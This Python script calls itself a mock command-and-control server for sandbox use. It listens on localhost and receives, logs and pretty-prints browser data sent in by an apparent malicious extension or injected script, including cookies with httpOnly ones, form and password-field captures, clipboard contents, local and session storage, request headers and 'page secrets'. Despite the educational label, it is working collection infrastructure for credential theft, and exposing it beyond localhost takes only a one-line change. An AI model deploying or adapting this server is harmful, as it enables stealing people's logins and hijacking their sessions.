#!/usr/bin/env python3
"""
MOCK C2 server — sandbox/educational use only.
Listens on http://localhost:8787, logs all ingest POSTs to ./log.ndjson
and prints a colourised console summary.

Run:  python3 server.py
"""

import http.server, json, os, sys, datetime, textwrap

LOG_FILE = os.path.join(os.path.dirname(__file__), "log.ndjson")
PORT = 8787

RESET  = "\033[0m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
GREEN  = "\033[92m"
GREY   = "\033[90m"
BOLD   = "\033[1m"

KIND_COLORS = {
    "cookies":             RED,
    "extensions":          YELLOW,
    "network_headers":     YELLOW,
    "network_headers_final": YELLOW,
    "sensitive_url":       RED,
    "visited_urls":        GREY,
    "storage_dump":        CYAN,
    "form_capture":        RED + BOLD,
    "form_capture_passive": RED,
    "password_fields":     RED + BOLD,
    "clipboard":           YELLOW,
    "page_secrets":        RED + BOLD,
}

def pretty(obj):
    return json.dumps(obj, indent=2, ensure_ascii=False)

def summarise(kind, payload):
    lines = []
    if kind == "cookies":
        lines.append(f"  total in profile : {payload.get('total', '?')}")
        lines.append(f"  interesting hits : {payload.get('hits', '?')}")
        for c in payload.get("sample", [])[:5]:
            lines.append(f"    [{c['domain']}] {c['name']} = {c['value_preview']}  (httpOnly={c['httpOnly']})")
    elif kind == "extensions":
        lines.append(f"  installed count  : {len(payload)}")
        for e in payload[:8]:
            lines.append(f"    {e['name']} v{e['version']} (id={e['id']}, enabled={e['enabled']})")
    elif kind in ("form_capture", "form_capture_passive"):
        lines.append(f"  url   : {payload.get('url', '?')}")
        for k, v in payload.get("fields", {}).items():
            lines.append(f"  field [{k}] = {str(v)[:60]}")
    elif kind == "storage_dump":
        ls = payload.get("localStorage", {})
        ss = payload.get("sessionStorage", {})
        lines.append(f"  url              : {payload.get('url', '?')}")
        lines.append(f"  localStorage     : {len(ls)} keys")
        lines.append(f"  sessionStorage   : {len(ss)} keys")
        for k in list(ls.keys())[:4]:
            lines.append(f"    ls[{k}] = {str(ls[k])[:60]}")
    elif kind == "page_secrets":
        lines.append(f"  url              : {payload.get('url', '?')}")
        for s in payload.get("secrets", []):
            lines.append(f"  [{s['name']}] {s['preview']}")
    elif kind == "clipboard":
        lines.append(f"  url     : {payload.get('url', '?')}")
        lines.append(f"  content : {payload.get('preview', '')}")
    elif kind == "sensitive_url":
        lines.append(f"  url : {payload.get('url', '?')}")
    elif kind == "network_headers":
        for req in payload[:3]:
            lines.append(f"  {req.get('method')} {req.get('url', '?')[:80]}")
            for h in req.get("headers", []):
                lines.append(f"    {h['name']}: {h['value_preview']}")
    else:
        snippet = pretty(payload)[:400]
        lines.append(textwrap.indent(snippet, "  "))
    return "\n".join(lines)


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # suppress default access log

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "content-type")
        self.end_headers()

    def do_POST(self):
        if self.path != "/ingest":
            self.send_error(404)
            return
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length)
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"ok":true}')

        try:
            obj = json.loads(raw)
        except Exception:
            return

        # Append to NDJSON log
        with open(LOG_FILE, "a") as f:
            f.write(raw.decode("utf-8", errors="replace") + "\n")

        kind    = obj.get("kind", "unknown")
        payload = obj.get("payload", {})
        ts      = datetime.datetime.fromtimestamp(obj.get("ts", 0) / 1000).strftime("%H:%M:%S")
        color   = KIND_COLORS.get(kind, CYAN)
        run_id  = obj.get("run", "?")[:8]

        print(f"\n{color}{BOLD}[{ts}] RECV kind={kind}  run={run_id}{RESET}")
        summary = summarise(kind, payload)
        if summary:
            print(summary)


def main():
    print(f"{GREEN}{BOLD}MOCK C2 server — sandbox/educational only{RESET}")
    print(f"Listening on http://localhost:{PORT}")
    print(f"Logging to  {LOG_FILE}")
    print(f"Press Ctrl+C to stop.\n")
    srv = http.server.HTTPServer(("127.0.0.1", PORT), Handler)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\nStopped.")

if __name__ == "__main__":
    main()
